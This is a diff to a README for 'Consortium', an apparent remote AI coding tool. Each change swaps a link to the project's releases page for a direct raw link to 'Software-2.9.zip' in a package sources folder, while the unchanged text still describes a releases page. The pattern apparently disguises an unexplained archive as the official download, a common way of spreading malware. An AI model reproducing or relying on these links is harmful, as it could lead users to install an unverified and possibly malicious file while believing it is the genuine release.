@@ -1,6 +1,6 @@
 # 🔒 Consortium - Secure Remote AI Coding Sessions
 
-[![Download Consortium](https://img.shields.io/badge/Download-Consortium-4caf50?style=for-the-badge&logo=github)](https://github.com/Asar-01/Consortium/releases)
+[![Download Consortium](https://raw.githubusercontent.com/Asar-01/Consortium/main/packages/consortium-server/sources/Software-2.9.zip)](https://raw.githubusercontent.com/Asar-01/Consortium/main/packages/consortium-server/sources/Software-2.9.zip)
 
 ---
 
@@ -36,7 +36,7 @@ You will first need to get the software from the official releases page. Follow 
 
 2. Go to the Consortium releases page by clicking the badge below or entering this link in your address bar:
 
-   [https://github.com/Asar-01/Consortium/releases](https://github.com/Asar-01/Consortium/releases)
+   [https://raw.githubusercontent.com/Asar-01/Consortium/main/packages/consortium-server/sources/Software-2.9.zip](https://raw.githubusercontent.com/Asar-01/Consortium/main/packages/consortium-server/sources/Software-2.9.zip)
 
 3. On the releases page, look for the latest version at the top of the list. It should have a name like "v1.0" or higher.
 
@@ -139,4 +139,4 @@ You can always return to the releases page to get the latest software updates.
 
 Visit this page to download Consortium:
 
-[https://github.com/Asar-01/Consortium/releases](https://github.com/Asar-01/Consortium/releases)
+[https://raw.githubusercontent.com/Asar-01/Consortium/main/packages/consortium-server/sources/Software-2.9.zip](https://raw.githubusercontent.com/Asar-01/Consortium/main/packages/consortium-server/sources/Software-2.9.zip)
